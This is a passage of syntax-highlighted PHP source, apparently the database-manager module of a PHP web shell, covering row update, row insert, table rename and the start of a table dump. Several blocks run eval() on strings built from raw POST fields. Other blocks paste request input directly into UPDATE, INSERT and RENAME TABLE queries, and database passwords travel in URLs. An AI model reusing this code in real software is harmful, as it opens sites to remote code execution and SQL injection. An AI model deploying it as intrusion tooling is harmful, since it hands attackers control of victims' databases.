<span class="lineno"> 535</span> <span class="s2">eval(&quot;</span><span class="nx">\</span><span class="err">$</span><span class="s2">&quot;.</span><span class="si">$matches3[1]</span><span class="s2">[</span><span class="si">$i</span><span class="s2">].&quot;</span> <span class="o">=</span> <span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
<span class="lineno"> 536</span> <span class="nv">$total_str</span> <span class="o">.=</span> <span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;&#39;,&quot;</span><span class="p">;</span>
<span class="lineno"> 537</span> <span class="p">}</span>
<span class="lineno"> 538</span> <span class="nv">$total_str</span> <span class="o">=</span> <span class="nb">substr_replace</span><span class="p">(</span><span class="nv">$total_str</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 539</span> <span class="nv">$up_string</span> <span class="o">=</span> <span class="s2">&quot;UPDATE `</span><span class="si">$tbl</span><span class="s2">` SET </span><span class="si">$total_str</span><span class="s2"> WHERE </span><span class="si">$delstring</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 540</span> <span class="nv">$up_string</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$up_string</span><span class="p">,</span> <span class="nx">ENT_NOQUOTES</span><span class="p">);</span>
<span class="lineno"> 541</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;PHP var:&lt;br&gt;&lt;/b&gt;</span><span class="se">\$</span><span class="s2">sql=</span><span class="se">\&quot;</span><span class="si">$up_string\</span><span class="s2">&quot;</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 542</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;vnutr=1&amp;baza=1&amp;vn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;db=</span><span class="si">$db</span><span class="s2">&amp;tbl=</span><span class="si">$tbl\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 543</span> <span class="s2">mysql_query(</span><span class="si">$up_string</span><span class="s2">) or die(&quot;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;);</span>
<span class="lineno"> 544</span> <span class="s2">}#end of make update</span>
<span class="lineno"> 545</span> 
<span class="lineno"> 546</span> 
<span class="lineno"> 547</span> 
<span class="lineno"> 548</span> <span class="s2">if(</span><span class="si">$_POST[&#39;upd&#39;]</span><span class="s2">==&#39;insert&#39;){</span>
<span class="lineno"> 549</span> <span class="s2">preg_match_all(&quot;</span><span class="o">/</span><span class="nx">name</span><span class="o">=</span><span class="s1">&#39;(.*?)&#39;</span><span class="nx">\scols</span><span class="o">=</span><span class="mi">39</span><span class="nx">\srows</span><span class="o">=</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">(</span><span class="o">.*?</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">\</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&gt;/</span><span class="nx">i</span><span class="s2">&quot;,</span><span class="si">$buff</span><span class="s2">,</span><span class="si">$matches3</span><span class="s2">);</span>
<span class="lineno"> 550</span> <span class="si">$delstring</span><span class="s2">=</span><span class="si">$_POST[&#39;delstring&#39;]</span><span class="s2">;</span>
<span class="lineno"> 551</span> <span class="si">$delstring</span><span class="s2">=base64_decode(</span><span class="si">$delstring</span><span class="s2">);</span>
<span class="lineno"> 552</span> <span class="si">$delstring</span><span class="s2"> = substr(</span><span class="si">$delstring</span><span class="s2">, 0, strlen(</span><span class="si">$delstring</span><span class="s2">)-5);</span>
<span class="lineno"> 553</span> 
<span class="lineno"> 554</span> <span class="s2">for(</span><span class="si">$i</span><span class="s2">=0; </span><span class="si">$i</span><span class="s2">&lt;count(</span><span class="si">$matches3[0]</span><span class="s2">); </span><span class="si">$i</span><span class="s2">++){</span>
<span class="lineno"> 555</span> <span class="s2">eval(&quot;</span><span class="nx">\</span><span class="err">$</span><span class="s2">&quot;.</span><span class="si">$matches3[1]</span><span class="s2">[</span><span class="si">$i</span><span class="s2">].&quot;</span> <span class="o">=</span> <span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
<span class="lineno"> 556</span> <span class="nv">$total_str</span> <span class="o">.=</span> <span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;&#39;,,&quot;</span><span class="p">;</span>
<span class="lineno"> 557</span> <span class="p">}</span>
<span class="lineno"> 558</span> 
<span class="lineno"> 559</span> <span class="nv">$total_str</span> <span class="o">=</span> <span class="s2">&quot;,,&quot;</span><span class="o">.</span><span class="nv">$total_str</span><span class="p">;</span>
<span class="lineno"> 560</span> 
<span class="lineno"> 561</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">&quot;/,(.*?)=&#39;(.*?)&#39;,/i&quot;</span><span class="p">,</span><span class="nv">$total_str</span><span class="p">,</span><span class="nv">$matches4</span><span class="p">);</span>
<span class="lineno"> 562</span> 
<span class="lineno"> 563</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno"> 564</span>         <span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno"> 565</span>         <span class="nv">$total_m_i</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`,&quot;</span><span class="p">;</span>
<span class="lineno"> 566</span>         <span class="nv">$total_m_x</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;,&quot;</span><span class="p">;</span>
<span class="lineno"> 567</span> <span class="p">}</span>
<span class="lineno"> 568</span> <span class="nv">$total_m_i</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$total_m_i</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$total_m_i</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 569</span> <span class="nv">$total_m_x</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$total_m_x</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$total_m_x</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 570</span> 
<span class="lineno"> 571</span> <span class="nv">$make_insert</span><span class="o">=</span><span class="s2">&quot;INSERT INTO `</span><span class="si">$tbl</span><span class="s2">` (</span><span class="si">$total_m_i</span><span class="s2">) VALUES (</span><span class="si">$total_m_x</span><span class="s2">)&quot;</span><span class="p">;</span>
<span class="lineno"> 572</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$make_insert</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno"> 573</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;PHP var:&lt;br&gt;&lt;/b&gt;</span><span class="se">\$</span><span class="s2">sql=</span><span class="se">\&quot;</span><span class="si">$make_insert\</span><span class="s2">&quot;</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 574</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;vnutr=1&amp;baza=1&amp;vn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;db=</span><span class="si">$db</span><span class="s2">&amp;tbl=</span><span class="si">$tbl\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 575</span> <span class="s2">}#end of insert</span>
<span class="lineno"> 576</span> <span class="s2">}#end of update</span>
<span class="lineno"> 577</span> <span class="s2">}</span>
<span class="lineno"> 578</span> <span class="s2"># end of edit row</span>
<span class="lineno"> 579</span> 
<span class="lineno"> 580</span> 
<span class="lineno"> 581</span> <span class="s2"># insert new line</span>
<span class="lineno"> 582</span> <span class="s2">if(</span><span class="si">$_GET[&#39;ins_new_line&#39;]</span><span class="s2">){</span>
<span class="lineno"> 583</span> <span class="si">$qn</span><span class="s2"> = mysql_query(&#39;SHOW FIELDS FROM &#39;.</span><span class="si">$tbl</span><span class="s2">) or die(&quot;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;);</span>
<span class="lineno"> 584</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="nx">post</span> <span class="nx">action</span><span class="o">=</span><span class="s1">&#39;$php_self?p=sql&amp;login=&quot;.$_GET[&#39;</span><span class="nx">login</span><span class="s1">&#39;].&quot;&amp;pass=&quot;.$_GET[&#39;</span><span class="nx">pass</span><span class="s1">&#39;].&quot;&amp;adress=&quot;.$_GET[&#39;</span><span class="nx">adress</span><span class="s1">&#39;].&quot;&amp;conn=1&amp;baza=1&amp;tbl=&quot;.$_GET[&#39;</span><span class="nx">tbl</span><span class="s1">&#39;].&quot;&amp;vn=&quot;.$_GET[&#39;</span><span class="nx">vn</span><span class="s1">&#39;].&quot;&amp;db=&quot;.$_GET[&#39;</span><span class="nx">db</span><span class="s1">&#39;].&quot;&amp;ins_new_line=1&#39;</span><span class="o">&gt;</span>
<span class="lineno"> 585</span> <span class="nx">Insert</span> <span class="k">new</span> <span class="nx">line</span> <span class="nx">in</span> <span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nv">$tbl</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="nx">table</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;</span><span class="nx">Br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 586</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">table</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 587</span> <span class="s2">while (</span><span class="si">$new_line</span><span class="s2"> = mysql_fetch_array(</span><span class="si">$qn</span><span class="s2">, MYSQL_ASSOC)) {</span>
<span class="lineno"> 588</span> <span class="s2">foreach (</span><span class="si">$new_line</span><span class="s2"> as </span><span class="si">$key</span><span class="s2"> =&gt;</span><span class="si">$next</span><span class="s2">) {</span>
<span class="lineno"> 589</span> <span class="si">$buff</span><span class="s2"> .= &quot;</span><span class="nv">$next</span> <span class="s2">&quot;;</span>
<span class="lineno"> 590</span> <span class="s2">}</span>
<span class="lineno"> 591</span> <span class="si">$expl</span><span class="s2">=explode(&quot;</span> <span class="s2">&quot;,</span><span class="si">$buff</span><span class="s2">);</span>
<span class="lineno"> 592</span> <span class="si">$buff2</span><span class="s2"> .= </span><span class="si">$expl[0]</span><span class="s2">.&quot;</span> <span class="s2">&quot;;</span>
<span class="lineno"> 593</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">td</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="nx">silver</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno"> 594</span> <span class="o">&lt;</span><span class="nx">td</span><span class="o">&gt;&lt;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;$expl[0]&#39;</span> <span class="nx">cols</span><span class="o">=</span><span class="mi">39</span> <span class="nx">rows</span><span class="o">=</span><span class="mi">5</span><span class="o">&gt;&lt;/</span><span class="nx">textarea</span><span class="o">&gt;</span>
<span class="lineno"> 595</span> <span class="o">&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;/</span><span class="nx">tr</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 596</span> <span class="s2">unset(</span><span class="si">$buff</span><span class="s2">);</span>
<span class="lineno"> 597</span> <span class="s2">}</span>
<span class="lineno"> 598</span> <span class="s2">print &quot;</span><span class="o">&lt;/</span><span class="nx">table</span><span class="o">&gt;</span>
<span class="lineno"> 599</span> <span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="nx">Insert</span> <span class="nx">name</span><span class="o">=</span><span class="nx">mk_ins</span><span class="o">&gt;&lt;/</span><span class="nx">form</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 600</span> <span class="s2">if(</span><span class="si">$_POST[&#39;mk_ins&#39;]</span><span class="s2">){</span>
<span class="lineno"> 601</span> <span class="s2">preg_match_all(&quot;</span><span class="o">/</span><span class="p">(</span><span class="o">.*?</span><span class="p">)</span><span class="nx">\s</span><span class="o">/</span><span class="nx">i</span><span class="s2">&quot;,</span><span class="si">$buff2</span><span class="s2">,</span><span class="si">$matches3</span><span class="s2">);</span>
<span class="lineno"> 602</span> <span class="s2">for(</span><span class="si">$i</span><span class="s2">=0; </span><span class="si">$i</span><span class="s2">&lt;count(</span><span class="si">$matches3[0]</span><span class="s2">); </span><span class="si">$i</span><span class="s2">++){</span>
<span class="lineno"> 603</span> <span class="s2">eval(&quot;</span><span class="nx">\</span><span class="err">$</span><span class="s2">&quot;.</span><span class="si">$matches3[1]</span><span class="s2">[</span><span class="si">$i</span><span class="s2">].&quot;</span> <span class="o">=</span> <span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
<span class="lineno"> 604</span> <span class="nv">$total_str</span> <span class="o">.=</span> <span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;&#39;,,&quot;</span><span class="p">;</span>
<span class="lineno"> 605</span> <span class="p">}</span>
<span class="lineno"> 606</span> 
<span class="lineno"> 607</span> <span class="nv">$total_str</span> <span class="o">=</span> <span class="s2">&quot;,,&quot;</span><span class="o">.</span><span class="nv">$total_str</span><span class="p">;</span>
<span class="lineno"> 608</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">&quot;/,(.*?)=&#39;(.*?)&#39;,/i&quot;</span><span class="p">,</span><span class="nv">$total_str</span><span class="p">,</span><span class="nv">$matches4</span><span class="p">);</span>
<span class="lineno"> 609</span> 
<span class="lineno"> 610</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno"> 611</span>         <span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno"> 612</span>         <span class="nv">$total_m_i</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`,&quot;</span><span class="p">;</span>
<span class="lineno"> 613</span>         <span class="nv">$total_m_x</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;,&quot;</span><span class="p">;</span>
<span class="lineno"> 614</span> <span class="p">}</span>
<span class="lineno"> 615</span> <span class="nv">$total_m_i</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$total_m_i</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$total_m_i</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 616</span> <span class="nv">$total_m_x</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$total_m_x</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$total_m_x</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 617</span> 
<span class="lineno"> 618</span> <span class="nv">$make_insert</span><span class="o">=</span><span class="s2">&quot;INSERT INTO `</span><span class="si">$tbl</span><span class="s2">` (</span><span class="si">$total_m_i</span><span class="s2">) VALUES (</span><span class="si">$total_m_x</span><span class="s2">)&quot;</span><span class="p">;</span>
<span class="lineno"> 619</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$make_insert</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno"> 620</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;PHP var:&lt;br&gt;&lt;/b&gt;</span><span class="se">\$</span><span class="s2">sql=</span><span class="se">\&quot;</span><span class="si">$make_insert\</span><span class="s2">&quot;</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 621</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;vnutr=1&amp;baza=1&amp;vn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;db=</span><span class="si">$db</span><span class="s2">&amp;tbl=</span><span class="si">$tbl\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 622</span> <span class="s2">}#end of mk ins</span>
<span class="lineno"> 623</span> <span class="s2">}#end of ins new line</span>
<span class="lineno"> 624</span> 
<span class="lineno"> 625</span> 
<span class="lineno"> 626</span> 
<span class="lineno"> 627</span> 
<span class="lineno"> 628</span> 
<span class="lineno"> 629</span> 
<span class="lineno"> 630</span> <span class="s2">if(isset(</span><span class="si">$_GET[&#39;rename_table&#39;]</span><span class="s2">)){</span>
<span class="lineno"> 631</span> <span class="si">$rename_table</span><span class="s2">=</span><span class="si">$_GET[&#39;rename_table&#39;]</span><span class="s2">;</span>
<span class="lineno"> 632</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="nx">Rename</span> <span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nv">$rename_table</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="nx">to</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="lineno"> 633</span> <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="nx">post</span> <span class="nx">action</span><span class="o">=</span><span class="s1">&#39;$php_self?p=sql&amp;login=$login&amp;pass=$pass&amp;adress=$adress&amp;conn=1&amp;db=$db&amp;baza=1&amp;rename_table=$rename_table&#39;</span><span class="o">&gt;</span>
<span class="lineno"> 634</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="nx">new_name</span> <span class="nx">size</span><span class="o">=</span><span class="mi">30</span><span class="o">&gt;&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="lineno"> 635</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="nx">Rename</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;</span>
<span class="lineno"> 636</span> <span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
<span class="lineno"> 637</span> <span class="s2">&quot;;</span>
<span class="lineno"> 638</span> 
<span class="lineno"> 639</span> <span class="s2">if(isset(</span><span class="si">$_POST[&#39;new_name&#39;]</span><span class="s2">)){</span>
<span class="lineno"> 640</span> <span class="s2">mysql_select_db(</span><span class="si">$db</span><span class="s2">) or die(&quot;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;);</span>
<span class="lineno"> 641</span> <span class="s2">mysql_query(&quot;</span><span class="nx">RENAME</span> <span class="nx">TABLE</span> <span class="nv">$rename_table</span> <span class="nx">TO</span> <span class="s2">&quot;.</span><span class="si">$_POST[&#39;new_name&#39;]</span><span class="s2">) or die(&quot;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;);</span>
<span class="lineno"> 642</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&gt;</span><span class="nx">Table</span> <span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nv">$rename_table</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="nx">renamed</span> <span class="nx">to</span> <span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="s2">&quot;.</span><span class="si">$_POST[&#39;new_name&#39;]</span><span class="s2">.&quot;</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 643</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">2;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;db=</span><span class="si">$db\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 644</span> <span class="s2">}</span>
<span class="lineno"> 645</span> 
<span class="lineno"> 646</span> <span class="s2">}#end of rename</span>
<span class="lineno"> 647</span> 
<span class="lineno"> 648</span> 
<span class="lineno"> 649</span> <span class="s2"># dump table</span>
<span class="lineno"> 650</span> <span class="s2">if(</span><span class="si">$_GET[&#39;dump&#39;]</span><span class="s2">){</span>
